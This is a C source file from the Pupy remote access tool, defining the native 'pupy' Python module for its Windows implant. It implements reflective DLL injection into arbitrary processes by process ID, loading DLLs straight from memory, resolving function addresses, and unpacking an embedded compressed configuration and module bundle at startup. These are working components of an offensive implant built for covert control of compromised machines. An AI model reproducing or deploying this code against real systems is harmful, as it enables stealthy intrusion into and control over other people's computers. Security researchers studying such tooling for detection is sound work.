/*
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
*/

#include "Python-dynload.h"
#include <stdio.h>
#include <windows.h>
#include "MyLoadLibrary.h"
#include "base_inject.h"

static char module_doc[] = "Builtins utilities for pupy";

#ifndef UINTPTR
 #ifndef _WIN32
   typedef DWORD UINTPTR;
 #else
   typedef ULONGLONG UINTPTR;
 #endif
#endif

UINTPTR _load_dll(const char *name, const char *bytes);

char pupy_config[65536]="####---PUPY_CONFIG_COMES_HERE---####\n"; //big array to have space for more config / code run at startup. scriptlets also takes more space !

static PyObject *ExecError;

extern const DWORD dwPupyArch;

#include "revision.h"

#include "library.c"
#include "lzmaunpack.c"

static PyObject *Py_on_exit_session_callback = NULL;

void on_exit_session(void) {
    PyGILState_STATE gstate;
	PyObject * pResult;

	if (!Py_on_exit_session_callback)
		return;

    gstate = PyGILState_Ensure();
    pResult = PyObject_CallObject(Py_on_exit_session_callback, NULL);
    PyGILState_Release(gstate);
}

static PyObject *Py_set_exit_session_callback(PyObject *self, PyObject *args)
{
	PyObject *old = Py_on_exit_session_callback;

	if (!PyArg_ParseTuple(args, "O", &Py_on_exit_session_callback))
		return NULL;

	Py_XINCREF(Py_on_exit_session_callback);
	Py_XDECREF(old);

	return PyBool_FromLong(1);
}

static PyObject *Py_get_modules(PyObject *self, PyObject *args)
{
	static PyObject *modules = NULL;
	if (!modules) {
		int rc;

		modules = PyDict_lzmaunpack(
			library_c_start,
			library_c_size
		);
	}

	Py_INCREF(modules);
	return modules;
}

static PyObject *
Py_get_pupy_config(PyObject *self, PyObject *args)
{
	union {
		unsigned int l;
		unsigned char c[4];
	} len;

	char *uncompressed;

	len.c[3] = pupy_config[0];
	len.c[2] = pupy_config[1];
	len.c[1] = pupy_config[2];
	len.c[0] = pupy_config[3];

	return PyObject_lzmaunpack(pupy_config+sizeof(int), len.l);
}

static PyObject *Py_get_arch(PyObject *self, PyObject *args)
{
	if(dwPupyArch==PROCESS_ARCH_X86){
		return Py_BuildValue("s", "x86");
	}
	else if(dwPupyArch==PROCESS_ARCH_X64){
		return Py_BuildValue("s", "x64");
	}
	return Py_BuildValue("s", "unknown");
}

static PyObject *Py_reflective_inject_dll(PyObject *self, PyObject *args)
{
	DWORD dwPid;
	const char *lpDllBuffer;
	DWORD dwDllLenght;
	const char *cpCommandLine;
	PyObject* py_is64bit;
	int is64bits;
	if (!PyArg_ParseTuple(args, "Is#O", &dwPid, &lpDllBuffer, &dwDllLenght, &py_is64bit))
		return NULL;
	is64bits = PyObject_IsTrue(py_is64bit);
	if(is64bits){
		is64bits=PROCESS_ARCH_X64;
	}else{
		is64bits=PROCESS_ARCH_X86;
	}
	if(inject_dll( dwPid, lpDllBuffer, dwDllLenght, NULL, is64bits) != ERROR_SUCCESS)
		return NULL;
	return PyBool_FromLong(1);
}

static PyObject *Py_load_dll(PyObject *self, PyObject *args)
{
	DWORD dwPid;
	const char *lpDllBuffer;
	DWORD dwDllLenght;

	const char *dllname;
	if (!PyArg_ParseTuple(args, "ss#", &dllname, &lpDllBuffer, &dwDllLenght))
		return NULL;

	return PyLong_FromVoidPtr(_load_dll(dllname, lpDllBuffer));
}

static PyObject *Py_find_function_address(PyObject *self, PyObject *args)
{
	const char *lpDllName = NULL;
	const char *lpFuncName = NULL;
	void *address = NULL;

	if (PyArg_ParseTuple(args, "ss", &lpDllName, &lpFuncName)) {
		address = MyFindProcAddress(lpDllName, lpFuncName);
	}

	return PyLong_FromVoidPtr(address);
}

static PyMethodDef methods[] = {
	{ "get_pupy_config", Py_get_pupy_config, METH_NOARGS, "get_pupy_config() -> string" },
	{ "get_arch", Py_get_arch, METH_NOARGS, "get current pupy architecture (x86 or x64)" },
	{ "get_modules", Py_get_modules, METH_NOARGS },
	{ "reflective_inject_dll", Py_reflective_inject_dll, METH_VARARGS|METH_KEYWORDS, "reflective_inject_dll(pid, dll_buffer, isRemoteProcess64bits)\nreflectively inject a dll into a process. raise an Exception on failure" },
	{ "load_dll", Py_load_dll, METH_VARARGS, "load_dll(dllname, raw_dll) -> ptr" },
	{ "set_exit_session_callback", Py_set_exit_session_callback, METH_VARARGS, "set_exit_session_callback(function)"},
	{ "find_function_address", Py_find_function_address, METH_VARARGS,
	  "find_function_address(dllname, function) -> address" },
	{ NULL, NULL },		/* Sentinel */
};

DL_EXPORT(void)
initpupy(void)
{
	PyObject *pupy = Py_InitModule3("pupy", methods, module_doc);
	if (!pupy) {
		return;
	}

	PyModule_AddStringConstant(pupy, "revision", GIT_REVISION_HEAD);
    ExecError = PyErr_NewException("pupy.error", NULL, NULL);
    Py_INCREF(ExecError);
    PyModule_AddObject(pupy, "error", ExecError);
}
